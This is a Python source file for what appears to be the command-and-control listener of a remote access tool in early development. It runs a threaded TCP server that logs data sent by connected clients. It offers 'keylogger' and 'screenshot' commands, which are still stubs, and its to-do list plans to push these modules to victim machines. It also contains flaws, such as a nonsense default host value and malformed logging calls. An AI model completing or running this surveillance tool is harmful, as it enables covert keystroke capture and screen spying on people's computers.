import socket
import threading
from os import getenv
from dotenv import load_dotenv
import sys
# TO DO LIST
# add file download upload
# encrypt the connection
# beautify terminal
# send commands to the client side to start the modules

# Logging
import logging
def get_logger():
    """
    Log Levels 
        - DEBUG
        - INFO 
        - WARNING
        - ERROR 
        - CRITICAL
    
    Default Log Level = INFO
    """
    log_level_str = getenv("LOG_LEVEL", "INFO").upper()
    numeric_level = getattr(logging, log_level_str, None)
    if not isinstance(numeric_level, int):
        raise ValueError(f"Invalid LOG_LEVEL: {log_level_str}")
    logger = logging.getLogger("logger")
    logger.setLevel(numeric_level)
    console_handler = logging.StreamHandler()
    console_handler.setLevel(numeric_level)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)
    return logger
logger = get_logger()

# Load .env    
load_dotenv()
LHOST = getenv("LHOST","localLHOST")
LPORT = getenv("LPORT","1911")
RECV_SIZE = int(getenv("RECV_SIZE","1024"))
ENCODING = str(getenv("ENCODE","utf-8"))
OUT_FILE="output.txt"
PROMPT = getenv("PROMPT","$ ")

logger.debug(f"LHOST={LHOST}")
logger.debug(f"LPORT={LPORT}")
logger.debug(f"RECV_SIZE={RECV_SIZE}")
logger.debug(f"ENCODING={ENCODING}")
logger.debug(f"OUT_FILE={OUT_FILE}")

def handle_client(client_socket, addr):
    logger.info(f"\nConnection from {addr}")
    try:
        while True:
            data = client_socket.recv(RECV_SIZE)
            if not data:
                break
            logger.debug(f"DATA SIZE = {len(data)}")
            message = data.decode(ENCODING)
            logger.info(f"\nReceived from {addr}: {message}\n{PROMPT}")
    except Exception as e:
        logger.error(f"Error with client {addr}: {e}")
    finally:
        client_socket.close()
        logger.info(f"Connection with {addr} closed")


def out_new_line(data:str,outfile:str="output.txt"):
    with open(outfile,"a") as file:
        file.write(f"{data}\n")

def start_server(LPORT=LPORT):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        LPORT = int(LPORT)
    except ValueError:
        logger.error("Invalid LPORT number. Please enter a valid integer.")
        return
    if LPORT < 1024:
        logger.warning("You must start the program as root to use LPORT 1024 and gold.")
        logger.warning("If the program does not work, change the LPORT number to a value greater than 1024.")
    elif LPORT > 65535:
        logger.error("Port number must lower then 65535")
    server.bind((LHOST, LPORT))
    server.listen(5)
    logger.info(f"\nTCP Server listening on {LHOST}:{LPORT}\n{PROMPT}")

    try:
        while True:
            client_socket, addr = server.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        logger.info("\nServer shutting down...")
    finally:
        server.close()

def terminal(args):
    def help_command():
        logger.info("Available commands:", ", ".join(commands.keys()))

    def keylogger_command():
        logger.info("keylogger started")
        # will send command to the client side to start the keylogger module

    def screenshot_command():
        logger.info("screenshot started")
        # will send command to the client side to start the screenshot module

    def exit_command():
        logger.info("Goodbye.")
        sys.exit(0)

    commands = {
        "help": help_command,
        "keylogger": keylogger_command,
        "screenshot": screenshot_command,
        "exit": exit_command,
    }

    command = commands.get(args)
    if command:
        command()
    else:
        logger.error("Invalid command. Available commands:", ", ".join(commands.keys()))
                
if __name__ == "__main__":

    print(r"""
    
    ___          ___    _  _____
  ,' _/ /7 _ __ / o | .' \/_  _/
 _\ `. //_7\V //  ,' / o / / /  
/___,'//\\  )//_/`_\/_n_/ /_/   
           //                   

    """)

    # Start server listener
    listening_thread = threading.Thread(target=start_server, daemon=True)
    listening_thread.start()

    try:
        while True:
            user_command = input(f"\n{PROMPT}")
            terminal(user_command)
    except KeyboardInterrupt:
        logger.info("\n[!] Interrupted. Exiting...")
